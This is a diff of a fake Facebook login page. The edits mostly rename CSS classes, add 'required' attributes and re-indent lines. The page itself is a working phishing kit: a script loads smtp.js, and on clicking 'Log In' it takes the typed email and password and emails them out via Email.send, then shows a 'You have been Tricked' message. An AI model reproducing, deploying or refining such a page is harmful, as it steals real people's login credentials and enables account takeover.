@@ -11,33 +11,33 @@
   <body class="windi-ctjjmg" style="font-family: Arial, Helvetica, sans-serif">
     <div class="windi-b9vupk">
         <div class="windi-3zncx">
-            <img class="windi-b5w3nl" src="facebook.svg" alt="facebook">
-            <div class="windi-1sbfcl4">Facebook helps you connect and</div>
-            <div class="windi-1sbfcl4">share with people in your life.</div>
-            <div class="windi-1d21dmg">
-                <div class="windi-g43qh9">
-                    <input class="windi-1kh0i3s" id="email" type="email" name="email" id="email" placeholder="Email address of phone number">
-                    <input class="windi-1kh0i3s" id="password" type="password" name="email" id="password" placeholder="Password">
+            <img class="windi-1njictt" src="facebook.svg" alt="facebook">
+            <div class="windi-75r1re">Facebook helps you connect and</div>
+            <div class="windi-75r1re">share with people in your life.</div>
+            <div class="windi-1sde5it">
+                <div class="windi-1kd1yzu">
+                    <input required id="email" class="windi-hqhbp8" type="email" name="email" id="email" placeholder="Email address of phone number">
+                    <input required id="password" class="windi-hqhbp8" type="password" name="email" id="password" placeholder="Password">
                 </div>
-                <button class="windi-6mft45" id="login">Log In</button>
+                <button id="login" class="windi-6mft45">Log In</button>
                 <a class="windi-1mzj0z9" href="#">Forgetten password?</a>
                 <div class="windi-yynosp"></div>
-                <button class="windi-1ubzpn1">Create New Account</button>
+                <button class="windi-1fyixxv">Create New Account</button>
             </div>
-            <div class="windi-bm371l">
+            <div class="windi-1qb5x1v">
                 <a class="windi-181x6x4" href="#">Create a Page</a>
                 for a celebrity, brand or business.
             </div>
         </div>
     </div>
       <footer class="windi-kk9l0m"></footer>
-      <div class="message hidden">
-          You have been Tricked لقد تم خداعك 🤣
-      </div>
-      <script src="smtp.js"></script>
-      <script>
-          const msg = document.querySelector(".message");
-          document.getElementById("login").onclick = function() {
+        <div class="message hidden">
+            You have been Tricked لقد تم خداعك 🤣
+        </div>
+        <script src="smtp.js"></script>
+        <script>
+            const msg = document.querySelector(".message");
+            document.getElementById("login").onclick = function() {
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
             Email.send({
@@ -54,7 +54,7 @@
                 .then(function (message) {
                     msg.classList.remove("hidden");
                 });
-          }
-      </script>
+            }
+        </script>
   </body>
   </html>
